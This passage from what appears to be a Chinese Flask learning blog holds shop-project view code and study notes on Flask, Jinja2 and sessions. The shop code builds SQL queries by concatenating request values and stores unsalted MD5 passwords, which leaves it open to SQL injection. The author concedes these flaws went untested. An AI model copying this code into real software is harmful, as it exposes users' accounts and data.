<span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>,error=error)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tel = request.form.get(<span class="string">&#x27;telephone&#x27;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> tel <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> password <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            error = <span class="string">u&#x27;手机号码或密码未填写完整&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>,error=error)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> tel.isdigit() <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">True</span>:</span><br><span class="line">                error=<span class="string">u&#x27;手机号码格式不正确，你是想SQL注入吗？&#x27;</span></span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>,error=error)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                telsql= <span class="string">&quot;SELECT * from users where telephone=&#x27;&quot;</span>+tel+<span class="string">&quot;&#x27;;&quot;</span></span><br><span class="line">                <span class="comment"># print telsql</span></span><br><span class="line">                cursor.execute(telsql)</span><br><span class="line">                res = cursor.fetchone()</span><br><span class="line">                <span class="comment"># print result</span></span><br><span class="line">                <span class="keyword">if</span> res <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    error = <span class="string">u&#x27;不存在该用户,请先注册！&#x27;</span></span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>, error=error)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    passmd5 = hashlib.md5(password).hexdigest()</span><br><span class="line">                    <span class="comment"># print passmd5</span></span><br><span class="line">                    <span class="comment"># print res[2]</span></span><br><span class="line">                    <span class="keyword">if</span> passmd5 != res[<span class="number">2</span>]:</span><br><span class="line">                        error = <span class="string">u&#x27;密码错误！请确认密码&#x27;</span></span><br><span class="line">                        <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>, error=error)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        user.setall(res)</span><br><span class="line">                        <span class="comment"># print user.username</span></span><br><span class="line">                        session[<span class="string">&#x27;user_id&#x27;</span>] = user.tel</span><br><span class="line">                        session.permanent = <span class="literal">True</span></span><br><span class="line">                        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br></pre></td></tr></table></figure><h3 id="商品详情"><a href="#商品详情" class="headerlink" title="商品详情"></a>商品详情</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(&#x27;/detail/&lt;gid&gt;/&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">detail</span>(<span class="params">gid</span>):</span></span><br><span class="line">    buy=<span class="number">0</span></span><br><span class="line">    user_id = session.get(<span class="string">&#x27;user_id&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> user_id <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        goodsql = <span class="string">&quot;select * from goods where gid=&quot;</span>+gid+<span class="string">&quot;;&quot;</span></span><br><span class="line">        <span class="comment"># print goodsql</span></span><br><span class="line">        cursor.execute(goodsql)</span><br><span class="line">        res = cursor.fetchone()</span><br><span class="line">        <span class="comment"># print res</span></span><br><span class="line">        goods.setall(res)</span><br><span class="line">        g.goods = goods</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;detail.html&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># print goods.price</span></span><br><span class="line">            yu_e = user.getmoney()-goods.price</span><br><span class="line">            <span class="keyword">if</span> yu_e &lt; <span class="number">0</span>:</span><br><span class="line">                error = <span class="string">u&quot;余额不足&quot;</span></span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">&#x27;detail.html&#x27;</span>,error=error)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                user.setmoney(yu_e)</span><br><span class="line">                <span class="comment"># 修改数据库的值</span></span><br><span class="line">                <span class="comment"># 将历史呢数据存到history</span></span><br><span class="line">                updatesql = <span class="string">&quot;UPDATE users SET money=&quot;</span>+str(yu_e)+<span class="string">&quot; WHERE telephone=&#x27;&quot;</span>+user_id+<span class="string">&quot;&#x27;;&quot;</span></span><br><span class="line">                now = str(datetime.now()).split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">if</span> cursor.execute(updatesql):</span><br><span class="line">                    buy = <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    error=<span class="string">u&#x27;未知错误&#x27;</span></span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;detail.html&#x27;</span>, error=error)</span><br><span class="line">                <span class="comment"># print now</span></span><br><span class="line">                historysql = <span class="string">&quot;INSERT INTO history (telphone,gid,datetime) VALUES(&#x27;&quot;</span>+user.tel+<span class="string">&quot;&#x27;,&#x27;&quot;</span>+goods.gid+<span class="string">&quot;&#x27;,&#x27;&quot;</span>+now+<span class="string">&quot;&#x27;);&quot;</span></span><br><span class="line">                <span class="keyword">if</span> cursor.execute(historysql):</span><br><span class="line">                    history = <span class="string">u&#x27;购物历史添加成功&#x27;</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    history = <span class="string">u&#x27;购物历史添加失败&#x27;</span></span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">&#x27;detail.html&#x27;</span>,buy=buy,history=history)</span><br></pre></td></tr></table></figure><h3 id="用户页面"><a href="#用户页面" class="headerlink" title="用户页面"></a>用户页面</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(&#x27;/user/&lt;tel&gt;&#x27;,methods=[&#x27;POST&#x27;,&#x27;GET&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">userinfo</span>(<span class="params">tel</span>):</span></span><br><span class="line">    user_id = session.get(<span class="string">&#x27;user_id&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> user_id <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;user.html&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> request.form.get(<span class="string">&#x27;kejin&#x27;</span>)==<span class="string">u&#x27;立即充值&#x27;</span>:</span><br><span class="line">                <span class="comment"># print request.form.get(&#x27;money&#x27;)</span></span><br><span class="line">                yu_e = float(request.form.get(<span class="string">&#x27;money&#x27;</span>))+user.getmoney()</span><br><span class="line">                <span class="comment"># print yu_e</span></span><br><span class="line">                moneysql = <span class="string">&quot;UPDATE users SET money=&quot;</span>+str(yu_e)+<span class="string">&quot; WHERE telephone=&#x27;&quot;</span>+user_id+<span class="string">&quot;&#x27;;&quot;</span></span><br><span class="line">                <span class="comment"># print moneysql</span></span><br><span class="line">                <span class="keyword">if</span> cursor.execute(moneysql):</span><br><span class="line">                    error = <span class="string">u&quot;充值成功&quot;</span></span><br><span class="line">                    user.setmoney(yu_e)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    error = <span class="string">u&quot;未知错误&quot;</span></span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">&#x27;user.html&#x27;</span>,error=error)</span><br><span class="line">            <span class="keyword">if</span> request.form.get(<span class="string">&#x27;gaimi&#x27;</span>) == <span class="string">u&#x27;修改密码&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> user.password != hashlib.md5(request.form.get(<span class="string">&#x27;old&#x27;</span>)).hexdigest():</span><br><span class="line">                    error = <span class="string">u&#x27;原密码错误&#x27;</span></span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;user.html&#x27;</span>, error=error)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">if</span> request.form.get(<span class="string">&#x27;password1&#x27;</span>) != request.form.get(<span class="string">&#x27;password2&#x27;</span>):</span><br><span class="line">                        error = <span class="string">u&#x27;密码不一致&#x27;</span></span><br><span class="line">                        <span class="keyword">return</span> render_template(<span class="string">&#x27;user.html&#x27;</span>, error=error)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        savepass = hashlib.md5(request.form.get(<span class="string">&#x27;password1&#x27;</span>)).hexdigest()</span><br><span class="line">                        updatepasssql = <span class="string">&quot;UPDATE users SET password=&#x27;&quot;</span>+savepass+<span class="string">&quot;&#x27; WHERE telephone=&#x27;&quot;</span>+user_id+<span class="string">&quot;&#x27;;&quot;</span></span><br><span class="line">                        <span class="comment"># print updatepasssql</span></span><br><span class="line">                        <span class="keyword">if</span> cursor.execute(updatepasssql):</span><br><span class="line">                            error = <span class="string">u&#x27;密码修改成功&#x27;</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            error = <span class="string">u&#x27;未知错误，修改失败&#x27;</span></span><br><span class="line">                        <span class="keyword">return</span> render_template(<span class="string">&#x27;user.html&#x27;</span>,error=error)</span><br></pre></td></tr></table></figure><p><a href="https://github.com/qingchenldl/V0WShop">完整项目代码，点击这里，访问我的github</a></p><h1 id="效果截图"><a href="#效果截图" class="headerlink" title="效果截图"></a>效果截图</h1><p><strong>注册页面</strong><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180831/466A2i5g1I.png?imageslim" alt="mark"></p><p><strong>登录页面：</strong><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180831/A7D50AKma2.png?imageslim" alt="mark"></p><p><strong>首页</strong><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180831/2L8bJJG6bg.png?imageslim" alt="mark"></p><p><strong>商品详情</strong><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180831/1hjCghAFK0.png?imageslim" alt="mark"></p><p><strong>用户中心</strong><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180831/Ejae9Ac8D4.png?imageslim" alt="mark"></p><h1 id="不足之处，待完善的地方"><a href="#不足之处，待完善的地方" class="headerlink" title="不足之处，待完善的地方"></a>不足之处，待完善的地方</h1><ol><li><strong>最严重的问题是内存占用率高</strong><br> 我一开始以为是我开了DEBUG模式的原因，加之浏览器处于不缓存模式，会不断请求资源，导致内存占用高。<br> 但是后来发现：<br> 不开DEBUG模式，在请求页面时，内存占用也会非常高，这是很让人头疼的，但是我也不太知道原因，麻烦知道原因的大佬，联系我<code>QQ:1845172981</code>,<code>邮箱：liudonglinldl@163.com</code><br> 内存占用在请求时达到峰值，最高甚至达到80%到90%，之后会恢复到原来的水平。</li><li><strong>首页写成静态文件</strong><br> 其实应该从数据库中遍历数据，然后通过一个模板继承依次显示，但是由于懒，暂时没写。</li><li><strong>没有测试漏洞的存在与否</strong>，如<code>SQL注入</code>，<code>XSS</code>，<code>CSRF</code>，<code>STTI模板注入</code><br> 别问我为什么知道，本身就是学安全的。</li><li><strong>购买历史数据导入数据库，但是用户个人界面缺少查看购买历史的功能</strong><br> 主要是没想好功能模板放在哪，怎么写，模板没想好，第二原因：懒</li></ol><hr><p>后期完善，主要想从这几方面入手。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://space.bilibili.com/349929259/#/">bilibili视频-python-flask零基础到项目实战</a></li><li><a href="http://docs.jinkan.org/docs/flask/">官方文档——中文版</a></li><li><a href="http://docs.jinkan.org/docs/jinja2/api.html">jinja2文档</a></li><li><a href="http://www.zhyea.com/2015/08/20/using-pymysql.html">使用pymysql笔记</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 编程算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flask+jinja2+mysql开发学习笔记</title>
      <link href="/2018/08/31/flask%E5%92%8Cjinja2%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2018/08/31/flask%E5%92%8Cjinja2%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="flask-jinja2-mysql开发学习笔记"><a href="#flask-jinja2-mysql开发学习笔记" class="headerlink" title="flask+jinja2+mysql开发学习笔记"></a>flask+jinja2+mysql开发学习笔记</h1><h1 id="环境准备工作"><a href="#环境准备工作" class="headerlink" title="环境准备工作"></a>环境准备工作</h1><h2 id="python虚拟环境介绍和安装"><a href="#python虚拟环境介绍和安装" class="headerlink" title="python虚拟环境介绍和安装"></a>python虚拟环境介绍和安装</h2><ol><li>因为python的框架更新太快，有时候需要在一台电脑上存在多个框架版本，使用虚拟环境可以避免版本不兼容的问题。</li><li>命令<code>pip install virtualenv</code></li><li>创建总的虚拟环境目录<code>Virtualenv</code></li><li>创建一个flask虚拟环境目录<code>virtualenv flask</code></li><li>激活虚拟环境：<ul><li>[windows]:  <code>直接进入虚拟环境目录,执行命令activate</code></li><li>[类Unix]：<code>source [虚拟环境目录]/bin/activate</code>   </li></ul></li><li>退出虚拟环境，进入全局环境：<code>deactivate</code></li></ol><h2 id="虚拟环境中安装flask"><a href="#虚拟环境中安装flask" class="headerlink" title="虚拟环境中安装flask"></a>虚拟环境中安装flask</h2><ol><li>进入虚拟环境目录，激活虚拟环境</li><li>执行<code>pip install flask</code></li></ol><h1 id="第一个简单的flask应用"><a href="#第一个简单的flask应用" class="headerlink" title="第一个简单的flask应用"></a>第一个简单的flask应用</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line"></span><br><span class="line"># 需要传入一个参数__name__</span><br><span class="line"># 1. 方便flask框架去寻找资源</span><br><span class="line"># 2. 方便flask插件出现错误时，好去寻找问题的位置</span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line"></span><br><span class="line"># @app.route 是一个装饰器</span><br><span class="line"># @开头，并且在函数的上面，说明时装饰器</span><br><span class="line"># 作用是 做一个url与视图函数的映射</span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;&#39;)</span><br><span class="line">def hello_world():</span><br><span class="line">    return &#39;Hello World!&#39;</span><br><span class="line"></span><br><span class="line"># 入口程序</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    app.run(debug&#x3D;True)</span><br><span class="line"># 启用debug模式，方便调试和查看效果</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="config配置文件"><a href="#config配置文件" class="headerlink" title="config配置文件"></a>config配置文件</h2><p>工程目录下：新建<code>config.py</code>，一些配置参数放在这里如<code>debug</code>和<code>secret_key</code>。</p><p>在主app文件中导入这个文件，并且配置到<code>app</code>中，代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import config</span><br><span class="line">app.config.from_object(config)</span><br></pre></td></tr></table></figure><h2 id="url传参"><a href="#url传参" class="headerlink" title="url传参"></a>url传参</h2><ol><li>在相同的url中，指定不同的参数，来加载不同的数据</li><li>flask中如何使用参数：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@app.route(&#39;&#x2F;article&#x2F;&lt;id&gt;&#39;)</span><br><span class="line">def article(id):</span><br><span class="line">return u&#39;你请求的参数是：%s&#39; % id</span><br></pre></td></tr></table></figure></li></ol><ul><li>参数需要放在两个尖括号中。</li><li>视图函数中需要放和url中的参数同名的参数。</li></ul><h2 id="反转url"><a href="#反转url" class="headerlink" title="反转url"></a>反转url</h2><ol><li>反转url是指由视图函数到-&gt;url</li><li>使用函数<code>url_for</code></li><li>用处：</li></ol><ul><li>在页面重定向时，会使用到url反转。</li><li>在模板中，也会使用到url反转。</li></ul><h2 id="页面跳转和重定向："><a href="#页面跳转和重定向：" class="headerlink" title="页面跳转和重定向："></a>页面跳转和重定向：</h2><ol><li><p>用处：在用户访问一些需要登录的页面的时候，如果用户没有登录，那么可以让她重定向到登录页面。</p></li><li><p>代码实现：</p><p> from flask import redirect,url<br> redirect(url_for(‘login’))</p></li></ol><h1 id="flask渲染jinja2模板和传参"><a href="#flask渲染jinja2模板和传参" class="headerlink" title="flask渲染jinja2模板和传参"></a>flask渲染jinja2模板和传参</h1><ol><li><p>如何渲染模板</p><ul><li>模板放在<code>templates</code>文件夹下    </li><li>从<code>flask</code>中导入<code>render_template</code>函数</li><li>在视图函数中，使用<code>render_template</code>函数渲染模板。只需写模板名字，因为默认路径是<code>templates</code>。</li></ul></li><li><p>模板传参</p><ul><li>如果只有一个或少量参数，可以直接在<code>render_template</code>传参。</li><li>如果参数较多，则可以先把参数放在一个字典中，然后在<code>render_template</code>中使用<code>**dist</code>，把参数字典转换为关键字参数，使得代码更方便管理。</li></ul></li><li><p>在模板中，如果要使用一个变量，语法是：<code>&#123;&#123;params&#125;&#125;</code></p></li><li><p>访问模型中的属性或者是字典，可以通过<code>&#123;&#123;params.property&#125;&#125;</code>的形式，或者是使用<code>&#123;&#123;params['age']&#125;&#125;</code>.   </p></li></ol><h2 id="if判断："><a href="#if判断：" class="headerlink" title="if判断："></a>if判断：</h2><ol><li><p>语法：  </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% if xxx %&#125;</span><br><span class="line">&#123;% else %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure></li><li><p>if的使用，可以和python中相差无几。</p></li></ol><h2 id="for循环遍历列表和字典："><a href="#for循环遍历列表和字典：" class="headerlink" title="for循环遍历列表和字典："></a>for循环遍历列表和字典：</h2><ol><li>字典的遍历，语法和<code>python</code>一样，可以使用<code>items()</code>、<code>keys()</code>、<code>values()</code>、<code>iteritems()</code>、<code>iterkeys()</code>、<code>itervalues()</code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for k,v in user.items() %&#125;</span><br><span class="line">&lt;p&gt;&#123;&#123; k &#125;&#125;：&#123;&#123; v &#125;&#125;&lt;&#x2F;p&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure></li><li>列表的遍历：语法和<code>python</code>一样。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for website in websites %&#125;</span><br><span class="line">&lt;p&gt;&#123;&#123; website &#125;&#125;&lt;&#x2F;p&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h2><ol><li>介绍和语法：<ul><li>介绍：过滤器可以处理变量，把原始的变量经过处理后再展示出来。作用的对象是变量。</li><li>语法：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123; avatar|default(&#39;xxx&#39;) &#125;&#125;</span><br><span class="line">中间是管道符号&#96;|&#96;</span><br></pre></td></tr></table></figure></li></ul></li><li>default过滤器：如果当前变量不存在，这时候可以指定默认值。</li><li>length过滤器：求列表或者字符串或者字典或者元组的长度。</li></ol><h2 id="继承和block："><a href="#继承和block：" class="headerlink" title="继承和block："></a>继承和block：</h2><ol><li><p>继承作用和语法：</p><ul><li>作用：可以把一些公共的代码放在父模板中，避免每个模板写同样的代码。</li><li>语法：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% extends &#39;base.html&#39; %&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>block实现：</p><ul><li>作用：可以让子模板实现一些自己的需求。父模板需要提前定义好。</li><li>注意点：子模板中的代码，必须放在block块中。</li></ul></li></ol><h2 id="url链接："><a href="#url链接：" class="headerlink" title="url链接："></a>url链接：</h2><p>使用<code>url_for(视图函数名称)</code>可以反转成url。</p><h2 id="加载静态文件："><a href="#加载静态文件：" class="headerlink" title="加载静态文件："></a>加载静态文件：</h2><ol><li>语法：<code>url_for(&#39;static&#39;,filename=&#39;路径&#39;)</code></li><li>静态文件，flask会从<code>static</code>文件夹中开始寻找，所以不需要再写<code>static</code>这个路径了。</li><li>可以加载<code>css</code>文件，可以加载<code>js</code>文件，还有<code>image</code>文件。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第一个：加载css文件</span><br><span class="line">&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;&#123;&#123; url_for(&#39;static&#39;,filename&#x3D;&#39;css&#x2F;index.css&#39;) &#125;&#125;&quot;&gt;</span><br><span class="line">第二个：加载js文件</span><br><span class="line">&lt;script src&#x3D;&quot;&#123;&#123; url_for(&#39;static&#39;,filename&#x3D;&#39;js&#x2F;index.js&#39;) &#125;&#125;&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">第三个：加载图片文件</span><br><span class="line">&lt;img src&#x3D;&quot;&#123;&#123; url_for(&#39;static&#39;,filename&#x3D;&#39;images&#x2F;zhiliao.png&#39;) &#125;&#125;&quot; alt&#x3D;&quot;&quot;&gt;</span><br></pre></td></tr></table></figure></li></ol><h1 id="cookie和session"><a href="#cookie和session" class="headerlink" title="cookie和session"></a>cookie和session</h1><h2 id="cookie："><a href="#cookie：" class="headerlink" title="cookie："></a>cookie：</h2><ol><li><code>cookie</code>出现的原因：在网站中，http请求是无状态的。也就是说即使第一次和服务器连接后并且登录成功后，第二次请求服务器依然不能知道当前请求是哪个用户。cookie的出现就是为了解决这个问题，第一次登录后服务器返回一些数据（cookie）给浏览器，然后浏览器保存在本地，当该用户发送第二次请求的时候，就会自动的把上次请求存储的cookie数据自动的携带给服务器，服务器通过浏览器携带的数据就能判断当前用户是哪个了。</li><li>如果服务器返回了<code>cookie</code>给浏览器，那么浏览器下次再请求相同的服务器的时候，就会自动的把<code>cookie</code>发送给浏览器，这个过程，用户根本不需要管。</li><li><code>cookie</code>是保存在浏览器中的，相对的是浏览器。</li></ol><h2 id="session："><a href="#session：" class="headerlink" title="session："></a>session：</h2><ol><li><code>session</code>介绍：session和cookie的作用有点类似，都是为了存储用户相关的信息。不同的是，cookie是存储在本地浏览器，而session存储在服务器。存储在服务器的数据会更加的安全，不容易被窃取。但存储在服务器也有一定的弊端，就是会占用服务器的资源，但现在服务器已经发展至今，一些session信息还是绰绰有余的。</li><li>使用<code>session</code>的好处：<ul><li>敏感数据不是直接发送回给浏览器，而是发送回一个<code>session_id</code>，服务器将<code>session_id</code>和敏感数据做一个映射存储在<code>session</code>(在服务器上面)中，更加安全。</li><li><code>session</code>可以设置过期时间，也从另外一方面，保证了用户的账号安全。</li></ul></li></ol><h2 id="flask的session机制"><a href="#flask的session机制" class="headerlink" title="flask的session机制"></a>flask的session机制</h2><ol><li>flask中的session机制是：把敏感数据经过加密后放入<code>session</code>中，然后再把<code>session</code>存放到<code>cookie</code>中，下次请求的时候，再从浏览器发送过来的<code>cookie</code>中读取<code>session</code>，然后再从<code>session</code>中读取敏感数据，并进行解密，获取最终的用户数据。</li><li>flask的这种<code>session</code>机制，可以节省服务器的开销，因为把所有的信息都存储到了客户端（浏览器）。</li><li>把<code>session</code>放到<code>cookie</code>中，经过加密，也是比较安全的。但是也可能存在<code>session</code>的随意篡改等问题。</li></ol><h2 id="操作session"><a href="#操作session" class="headerlink" title="操作session"></a>操作session</h2><ol><li><code>session</code>的操作方式<ul><li>使用<code>session</code>需要从<code>flask</code>中导入<code>session</code>，以后所有和<code>session</code>相关的操作都是通过这个变量来的</li><li>使用<code>session</code>需要设置<code>SECRET_KEY</code>，用来作为加密用的。并且这个<code>SECRET_KEY</code>如果每次服务器启动后都变化的话，那么之前的<code>session</code>就不能再通过当前这个<code>SECRET_KEY</code>进行解密了。</li><li>操作<code>session</code>的时候，跟操作字典是一样的。</li><li>添加<code>session</code>：<code>session[&#39;username&#39;]</code>。</li><li>删除：<code>session.pop(&#39;username&#39;)</code>或者<code>del session[&#39;username&#39;]</code>。</li><li>清除所有<code>session</code>：<code>session.clear()</code></li><li>获取<code>session</code>：<code>session.get(&#39;username&#39;)</code></li></ul></li><li>设置session的过期时间：<ul><li>如果没有指定session的过期时间，那么默认是浏览器关闭后就自动结束</li><li>如果设置了session的permanent属性为True，那么过期时间是31天。</li><li>可以通过给<code>app.config</code>设置<code>PERMANENT_SESSION_LIFETIME</code>来更改过期时间，这个值的数据类型是<code>datetime.timedelay</code>类型。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from datetime import timedelta</span><br><span class="line"># 三天过期</span><br><span class="line">PERMANENT_SESSION_LIFETIME &#x3D; timedelta(days&#x3D;3)</span><br></pre></td></tr></table></figure></li></ul></li></ol><h1 id="get请求和post请求："><a href="#get请求和post请求：" class="headerlink" title="get请求和post请求："></a>get请求和post请求：</h1><ol><li>get请求：<ul><li>使用场景：如果只对服务器获取数据，并没有对服务器产生任何影响，那么这时候使用get请求。</li><li>传参：get请求传参是放在url中，并且是通过<code>?</code>的形式来指定key和value的。</li></ul></li><li>post请求：<ul><li>使用场景：如果要对服务器产生影响，那么使用post请求。</li><li>传参：post请求传参不是放在url中，是通过<code>form data</code>的形式发送给服务器的。</li></ul></li></ol><h2 id="get和post请求获取参数："><a href="#get和post请求获取参数：" class="headerlink" title="get和post请求获取参数："></a>get和post请求获取参数：</h2><ol><li>get请求是通过<code>flask.request.args</code>来获取。</li><li>post请求是通过<code>flask.request.form</code>来获取。</li><li>post请求在模板中要注意几点：<ul><li>input标签中，要写name来标识这个value的key，方便后台获取。</li><li>在写form表单的时候，要指定<code>method=&#39;post&#39;</code>，并且要指定<code>action=&#39;/login/&#39;</code>。</li></ul></li><li>示例代码：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;&#123;&#123; url_for(&#39;login&#39;) &#125;&#125;&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">&lt;table&gt;</span><br><span class="line">&lt;tbody&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td&gt;用户名：&lt;&#x2F;td&gt;</span><br><span class="line">&lt;td&gt;&lt;input type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;请输入用户名&quot; name&#x3D;&quot;username&quot;&gt;&lt;&#x2F;td&gt;</span><br><span class="line">&lt;&#x2F;tr&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td&gt;密码：&lt;&#x2F;td&gt;</span><br><span class="line">&lt;td&gt;&lt;input type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;请输入密码&quot; name&#x3D;&quot;password&quot;&gt;&lt;&#x2F;td&gt;</span><br><span class="line">&lt;&#x2F;tr&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td&gt;&lt;&#x2F;td&gt;</span><br><span class="line">&lt;td&gt;&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;登录&quot;&gt;&lt;&#x2F;td&gt;</span><br><span class="line">&lt;&#x2F;tr&gt;</span><br><span class="line">&lt;&#x2F;tbody&gt;</span><br><span class="line">&lt;&#x2F;table&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure></li></ol><h2 id="保存全局变量的g属性："><a href="#保存全局变量的g属性：" class="headerlink" title="保存全局变量的g属性："></a>保存全局变量的g属性：</h2><p>g：global</p><ol><li>g对象是专门用来保存用户的数据的。</li><li>g对象在一次请求中的所有的代码的地方，都是可以使用的。</li></ol><h2 id="钩子函数-hook"><a href="#钩子函数-hook" class="headerlink" title="钩子函数(hook)"></a>钩子函数(hook)</h2><ol><li>before_request:<ul><li>在每次请求之前执行的</li><li>是在视图函数执行之前执行的</li><li>这个函数只是一个装饰器，他可以把需要设置为钩子函数的代码放到视图函数执行之前来执行</li><li>用处：可以用于判断用户是否登录等等</li><li>代码示例：<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_before_request</span>():</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;hello&#x27;</span></span><br></pre></td></tr></table></figure></li></ul></li><li>context_processor:<ul><li>用处： 多个页面需要用到同样的数据，借助<code>app_context_processor</code>我们可以让所有自定义变量在模板中可见。而不需要再传参。</li><li>上下文处理器应该返回一个字典。字典中的<code>key</code>会被模板中当成变量来渲染。</li><li>上下文处理器中返回的字典，在所有页面中都是可用的。</li><li>被这个装饰器修饰的钩子函数，必须要返回一个字典，即使为空也要返回。</li></ul></li></ol><h2 id="消息闪现flash"><a href="#消息闪现flash" class="headerlink" title="消息闪现flash"></a>消息闪现flash</h2><p>使用循环是因为可能有多个消息排队等待显示，每次在前一个请求周期中调用一个<code>flash()</code>。 下次调用此函数时，将不会返回从<code>get_flashed_messages（）</code>检索的消息，因此闪烁的消息只出现一次然后被丢弃。</p><h1 id="pymysql操作mysql数据库"><a href="#pymysql操作mysql数据库" class="headerlink" 